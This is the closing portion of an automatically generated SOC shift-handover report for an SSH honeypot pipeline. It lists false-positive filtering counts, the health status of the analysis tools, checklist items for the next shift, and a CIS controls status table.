| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 6 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 549 cases |
| Tool 34  | Credential Extractor        | ✅ 4994 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 132 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 306 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (10.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 138 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 361 priority case(s) shown individually · 126 recon entry/entries in table (5 group(s) consolidating 11 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-14T17:29:42Z_
